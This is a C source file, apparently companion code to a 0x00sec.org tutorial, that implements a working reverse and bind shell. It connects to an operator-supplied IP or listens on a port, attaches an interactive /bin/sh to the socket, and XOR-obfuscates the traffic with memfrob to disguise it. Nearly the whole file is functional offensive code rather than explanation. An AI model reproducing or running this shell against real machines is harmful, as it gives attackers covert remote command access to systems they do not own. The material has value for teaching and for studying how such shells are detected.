/*
  Remote Shells
  Copyright (c) 2016 picoFlamingo

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*************************************************************
  Read the post at 0x00sec.org

https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306
**********************************************************************/
#include <stdio.h>
#include <stdlib.h>  
#include <string.h>

#include <unistd.h> 

#include <sys/socket.h>
#include <arpa/inet.h>

#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

int
server_init (int port)
{
  int                s, s1;
  socklen_t          clen;
  struct sockaddr_in serv, client;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = htonl(INADDR_ANY);
  
  if ((bind (s, (struct sockaddr *)&serv, 
	     sizeof(struct sockaddr_in))) < 0)
    {
      perror ("bind:");
      exit (EXIT_FAILURE);
    }

  if ((listen (s, 10)) < 0)
    {
      perror ("listen:");
      exit (EXIT_FAILURE);
    }
  clen = sizeof(struct sockaddr_in);
  if ((s1 = accept (s, (struct sockaddr *) &client, 
		    &clen)) < 0)
    {
      perror ("accept:");
      exit (EXIT_FAILURE);
    }

  return s1;

}

int
client_init (char *ip, int port)
{
  int                s;
  struct sockaddr_in serv;

  printf ("+ Connecting to %s:%d\n", ip, port);

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = inet_addr(ip);

  if (connect (s, (struct sockaddr *) &serv, sizeof(serv)) < 0) 
    {
      perror("connect:");
      exit (EXIT_FAILURE);
    }

  return s;
}


int
start_shell (int s)
{
  char *name[3] ;

  printf ("+ Starting shell\n");
  dup2 (s, 0);
  dup2 (s, 1);
  dup2 (s, 2);
  
  name[0] = "/bin/sh";
  name[1] = "-i";
  name[2] = NULL;
  execv (name[0], name );
  exit (1);

  return 0;
}


void
async_read (int s, int s1)
{
  fd_set         rfds;
  struct timeval tv;
  int            max = s > s1 ? s : s1;
  int            len, r;
  char           buffer[1024];

  max++;
  while (1)
    {
      FD_ZERO(&rfds);
      FD_SET(s,&rfds);
      FD_SET(s1,&rfds);

      /* Time out. */
      tv.tv_sec = 1;
      tv.tv_usec = 0;

      if ((r = select (max, &rfds, NULL, NULL, &tv)) < 0)
	{
	  perror ("select:");
	  exit (EXIT_FAILURE);
	}
      else if (r > 0) /* If there is data to process */
	{
	  if (FD_ISSET(s, &rfds))
	    {
	      memset (buffer, 0, 1024);
	      if ((len = read (s, buffer, 1024)) <= 0) 	exit (1);
	      memfrob (buffer, len);

	      write (s1, buffer, len);
	    }
	  if (FD_ISSET(s1, &rfds))
	    {
	      memset (buffer, 0, 1024);
	      if ((len = read (s1, buffer, 1024)) <= 0) exit (1);

	      memfrob (buffer, len);
	      write (s, buffer, len);
	    }
	}
    }
}

void
secure_shell (int s)
{
  pid_t  pid;
  int    sp[2];

  /* Create a socketpair to talk to the child process */
  if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
    {
      perror ("socketpair:");
      exit (1);
    }

  /* Fork a shell */
  if ((pid = fork ()) < 0)
    {
      perror ("fork:");
      exit (1);
    }
  else
    if (!pid) /* Child Process */
      {
	close (sp[1]);
	close (s);

	start_shell (sp[0]);
	/* This function will never return */
      }

  /* At this point we are the father process */
  close (sp[0]);

  printf ("+ Starting async read loop\n");
  async_read (s, sp[1]);

}




int
main (int argc, char *argv[])
{
  /* FIXME: Check command-line arguments */
  if (argv[1][0] == 'c')
    secure_shell (client_init (argv[2], atoi(argv[3])));
  else if (argv[1][0] == 's')
    secure_shell (server_init (atoi(argv[2])));
  else if (argv[1][0] == 'a')
    async_read (client_init (argv[2], atoi(argv[3])), 0);
  else if (argv[1][0] == 'b')
    async_read (server_init (atoi(argv[2])), 0);
		  

  return 0;
}
